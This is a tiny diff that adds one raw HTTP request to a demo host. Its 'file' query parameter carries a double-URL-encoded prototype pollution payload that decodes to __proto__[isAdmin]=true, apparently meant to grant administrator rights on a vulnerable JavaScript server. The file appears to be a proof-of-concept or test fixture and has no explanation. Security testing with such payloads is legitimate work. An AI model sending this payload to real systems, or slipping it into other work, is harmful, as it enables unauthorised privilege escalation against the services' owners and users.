@@ -1,0 +1,4 @@
+GET /a?file=__proto__%255BisAdmin%255D%253Dtrue HTTP/1.1
+Host: demo.example.com
+Connection: close
+
